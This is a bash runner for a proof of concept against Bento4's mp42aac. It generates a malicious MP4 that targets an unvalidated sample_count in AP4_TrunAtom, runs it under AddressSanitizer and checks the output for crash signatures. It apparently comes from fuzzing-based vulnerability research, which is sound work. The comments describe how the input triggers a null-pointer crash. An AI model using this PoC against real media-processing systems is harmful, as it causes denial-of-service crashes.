#!/bin/bash
# PoC runner for Bento4 VULN 002: AP4_TrunAtom unvalidated sample_count

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4ContainerAtom_h"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
MP4_FILE="$POC_DIR/vuln_002.mp4"
RESULT_FILE="$POC_DIR/vuln_002_result.txt"
ASAN_LOG_BASE="$POC_DIR/asan.log"

# Step 1: Generate the malicious MP4
echo "[*] Generating malicious MP4..."
python3 "$POC_DIR/vuln_002_gen.py"

echo "[*] Running mp42aac with malicious input..."

# Step 2: Run the binary with ASAN options
# allocator_may_return_null=1: ASAN returns NULL for huge allocations (instead of aborting)
#   -> EnsureCapacity's NULL check fires, m_Items stays NULL
#   -> TrunAtom loop dereferences m_Entries[0] = NULL -> SIGSEGV caught by ASAN
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_BASE}:allocator_may_return_null=1" \
    "$BINARY" "$MP4_FILE" /dev/null > "$RESULT_FILE" 2>&1 || true

echo "[*] Binary exited."

# Step 3: Append any ASAN log files to result
echo "" >> "$RESULT_FILE"
echo "=== ASAN LOG FILES ===" >> "$RESULT_FILE"
for logfile in "${ASAN_LOG_BASE}".*; do
    if [ -f "$logfile" ]; then
        echo "--- $logfile ---" >> "$RESULT_FILE"
        cat "$logfile" >> "$RESULT_FILE"
    fi
done

echo "[*] Results written to $RESULT_FILE"

# Step 4: Show summary
echo ""
echo "=== Result summary ==="
if grep -qE "AddressSanitizer|SIGSEGV|heap-buffer-overflow|stack-buffer-overflow|SEGFAULT|runtime error|UndefinedBehavior|alloc-dealloc-mismatch|heap-use-after-free|attempting to allocate|requested allocation size" "$RESULT_FILE" 2>/dev/null; then
    echo "CRASH/SANITIZER ERROR DETECTED"
else
    echo "No sanitizer error detected in output"
fi
cat "$RESULT_FILE"
